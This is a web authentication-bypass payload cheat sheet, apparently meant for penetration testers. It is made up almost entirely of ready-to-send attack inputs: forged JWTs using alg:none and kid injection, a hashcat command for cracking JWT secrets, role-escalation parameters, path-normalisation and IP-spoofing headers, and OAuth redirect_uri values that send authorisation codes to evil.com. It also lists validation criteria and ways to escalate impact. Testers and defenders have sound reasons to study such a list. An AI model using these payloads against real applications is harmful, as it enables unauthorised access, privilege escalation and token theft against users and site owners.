# Auth Bypass — Payload Cheatsheet

## Detection Methodology

### Direct Access (no auth)
```
# Remove auth header entirely
GET /admin/dashboard
(no Authorization or Cookie header)

# Remove just the token value
Authorization: Bearer
Cookie: session=

# Use empty/null values
Authorization: Bearer null
Authorization: Bearer undefined
Cookie: session=0
```

### Token Manipulation
```
# JWT alg:none
{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.

# JWT weak secret
# Crack with: hashcat -m 16500 jwt.txt wordlist.txt
# Then forge with any claims

# JWT kid injection
{"alg":"HS256","kid":"../../dev/null"}  → key is empty

# Remove signature
eyJ...header.eyJ...payload.
(remove everything after second dot)
```

### Parameter-Based Bypass
```
# Admin param injection
POST /api/users {"username":"test","role":"admin"}
POST /api/users {"username":"test","isAdmin":true}
POST /api/users {"username":"test","admin":1}

# Hidden admin endpoints
GET /admin
GET /administrator
GET /management
GET /internal
GET /debug
GET /_admin
GET /api/admin/users
```

### HTTP Method Override
```
# Some frameworks check auth only on specific methods
X-HTTP-Method-Override: PUT
X-HTTP-Method: DELETE
X-Method-Override: PATCH
```

### Path Traversal Bypass
```
# Nginx/Apache path normalization
/admin → 403
/admin/ → 200
/admin/. → 200
/./admin → 200
//admin → 200
/admin..;/ → 200 (Tomcat)
/%2e/admin → 200
/admin%20 → 200
/admin%09 → 200
```

### IP-Based Bypass
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
True-Client-IP: 127.0.0.1
```

## OAuth/SSO Bypass
```
# Missing state parameter (CSRF on OAuth)
# Redirect URI manipulation
?redirect_uri=https://evil.com
?redirect_uri=https://target.com.evil.com
?redirect_uri=https://target.com@evil.com
?redirect_uri=https://target.com%40evil.com

# Scope escalation
?scope=openid profile email admin

# Token/code reuse across applications
# Token leakage via referer header
```

## Validation Criteria

1. Access to protected functionality WITHOUT valid credentials
2. Elevated privileges beyond the authenticated user's role
3. Consistent bypass (not a race condition or cache artifact)
4. Works on production-equivalent configuration

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| View protected data | Read admin dashboard or other users' data |
| Modify data | Update/delete resources via admin functions |
| Create admin accounts | Self-registration with admin role |
| Full admin access | All admin functionality accessible |
